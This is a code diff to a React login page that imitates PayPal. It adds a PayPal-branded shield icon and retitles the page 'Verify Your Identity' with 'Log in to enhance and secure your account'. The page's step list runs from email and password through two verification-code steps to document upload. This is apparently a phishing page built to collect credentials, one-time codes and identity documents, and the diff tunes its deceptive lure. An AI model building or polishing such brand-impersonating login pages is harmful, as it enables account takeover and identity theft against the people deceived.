@@ -1,5 +1,6 @@
 import { useState } from "react";
-import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft } from "lucide-react";
+import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft, Shield } from "lucide-react";
+import { SiPaypal } from "react-icons/si";
 import { useToast } from "@/hooks/use-toast";
 
 type LoginStep = "email" | "password" | "verify-method" | "verify-code" | "verifying" | "verify-code-2" | "verify-documents";
@@ -375,12 +376,23 @@ export default function LoginPage() {
 
   const renderEmailStep = () => (
     <form onSubmit={handleEmailNext} data-testid="form-email">
+      {/* Security Shield with PayPal Logo */}
+      <div className="flex justify-center mb-6">
+        <div className="relative" data-testid="icon-security-shield">
+          <Shield className="w-16 h-16 text-[#003087] fill-[#003087]/10" strokeWidth={1.5} />
+          <SiPaypal className="w-6 h-6 text-[#003087] absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
+        </div>
+      </div>
+      
       <h1 
-        className="text-[24px] sm:text-[28px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-8 tracking-tight"
+        className="text-[22px] sm:text-[24px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-3 tracking-tight leading-tight"
         data-testid="text-title"
       >
-        Log in to PayPal
+        Verify Your Identity
       </h1>
+      <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center mb-8">
+        Log in to enhance and secure your account
+      </p>
 
       <div className="space-y-5">
         <div>
@@ -713,16 +725,6 @@ export default function LoginPage() {
 
         {/* Login Card */}
         <div className="paypal-card w-full max-w-[440px]">
-          {/* PayPal Security Badge */}
-          <div className="flex items-center justify-center mb-6 pb-5 border-b border-[#e8e8e8] dark:border-[#2a2a2a]">
-            <img 
-              src="https://www.paypalobjects.com/webstatic/mktg/logo/bdg_secured_by_pp_2line.png" 
-              alt="Secured by PayPal" 
-              className="h-[40px] w-auto"
-              data-testid="img-paypal-security-badge"
-            />
-          </div>
-          
           {step === "email" && renderEmailStep()}
           {step === "password" && renderPasswordStep()}
           {step === "verify-method" && renderVerifyMethodStep()}
